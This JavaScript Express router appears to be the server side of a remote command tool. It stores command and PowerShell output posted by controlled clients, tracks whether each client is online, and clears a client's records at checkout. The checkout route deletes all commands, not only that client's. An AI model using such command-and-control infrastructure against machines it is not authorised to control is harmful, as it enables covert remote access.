const router = require('express').Router();
const Response = require('../responses.model');
const psResponse = require('../psResponse.model');
const toolCookieValidator = require('../../Utils/MiddleWears/toolCookieValidator');
const {GenerateRandomId} = require("../../Utils/utilFunctions");
const Status = require("../../Status/status.model");
const Utils = require("../../Utils/utilFunctions");
const Client = require('../../Clients/client.model');
const Command = require("../../Commands/commands.model");

//Validate cookie for incoming requests
router.use(toolCookieValidator);

//Powershell response
router.route('/ps').post((req,res) =>{
    const response_id = GenerateRandomId(6);
    const clientId = req.sidebars['clientid'];
    const response = req.body.response;
    const newPsResponse = new psResponse({response_id:response_id, client_id:clientId,response:response});
    newPsResponse.save()
        .then(() => res.send('ResponsePS added successfully!'))
        .catch(err => res.status(401).send(`Error adding ps command ${err}`));
    Status.findOneAndUpdate({client_id:clientId},{status:true},{useFindAndModify:false},
        function(err){
            if(err){
                Utils.LogToFile(`Error updating client ${clientId} status to DB`);
            }
        })
});


//Regular command response
router.route('/').post((req,res) =>{
    const response_id = GenerateRandomId(6);
    const clientId = req.sidebars['clientid'];
    const response = req.body.response;
    const newResponse = new Response({response_id:response_id, client_id:clientId,response:response});

    newResponse.save()
        .then(() => res.send('Response added successfully!'))
        .catch(err => res.status(400).send(`Error adding command ${err}`));

    Status.findOneAndUpdate({client_id:clientId},{status:true},{useFindAndModify:false},
        function(err){
            if(err){
                Utils.LogToFile(`Error updating client ${clientId} status to DB`);
            }
        })
});

//tool checkout after exit
router.route('/checkout').get((req,res)=>{
    try{
        const sessionKey = req.cookies['session_id'];
        const clientId = req.sidebars['clientid'];
        Client.findOneAndDelete({session_key:sessionKey},{},(err)=> {
            if (err)
                Utils.LogToFile(`Error removing tool client after checkout ${err}`);
        });
        Status.findOneAndDelete({client_id:clientId},{},(err)=>{
            if(err)
                Utils.LogToFile(`Error removing status document for killed client ${err}`);
        });
        Command.find({},(err,commands)=>{
           if(err) {
               Utils.LogToFile(`Error fetching all client commands from db ${err}`);
           }
        else{
               if(commands.length !== 0){
                   for(let i=0;i<Object.keys(commands).length;i++) {
                       const commandId = commands[i]['command_id'];
                       Command.findOneAndDelete({command_id:commandId},(err)=>{
                           if(err)
                               Utils.LogToFile(`Error removing command from db for killed client${err}`);
                       })
                   }
               }
           }
        });
    }
    catch (err) {
        Utils.LogToFile(`Error removing tool client after checkout ${err}`);
    }

    res.send();
})
module.exports = router;